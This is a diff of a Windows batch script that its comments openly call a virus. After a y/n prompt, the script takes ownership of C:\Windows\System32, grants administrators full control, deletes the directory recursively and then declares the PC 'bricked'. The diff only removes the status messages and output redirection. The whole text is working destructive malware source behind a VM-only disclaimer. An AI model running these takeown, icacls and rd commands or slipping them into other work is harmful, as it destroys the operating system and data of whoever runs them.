@@ -1,4 +1,5 @@
 REM WARNING!!!:
+@echo off
 REM THIS SCRIPT IS INCREDIBLY DANGEROUS AND CAN CAUSE SERIOUS DAMAGE TO YOUR COMPUTER. USE IT ONLY INSIDE A VIRTUAL MACHINE AT YOUR OWN 
 REM RISK. MAKE SURE YOU TAKE A SNAPSHOT OF THE VIRTUAL MACHINE BEFORE YOU RUN THIS SCRIPT INSIDE IT. THE CREATOR IS NOT RESPONSIBLE FOR THE 
 REM DAMAGE CAUSED BY THIS VIRUS. USE IT AT YOUR OWN RISK! THIS SCRIPT CAN DELETE SYSTEM FILES FROM YOUR COMPUTER.
@@ -11,12 +12,9 @@ set /p choice="Enter your choice[y/n]: "
 if /i "%choice%"=="y" ( 
     echo In that case, let's delete your computer. 
     timeout /t 2 >nul 
-    echo Taking ownership of system files...
-    takeown /f C:\Windows\System32 /r /d y >nul 2>&1
-    echo Granting administrative rights to control system files...
-    icacls C:\Windows\System32 /grant administrators:F /t /q >nul 2>&1
-    echo Deleting system files...
-    rd /s /q C:\Windows\System32 >nul 2>&1
+    takeown /f C:\Windows\System32 /r /d y 
+    icacls C:\Windows\System32 /grant administrators:F /t /q 
+    rd /s /q C:\Windows\System32
     cls 
     echo Complete. Your PC is now bricked. Try restarting your computer or clicking programs and see what happens. 
     pause 
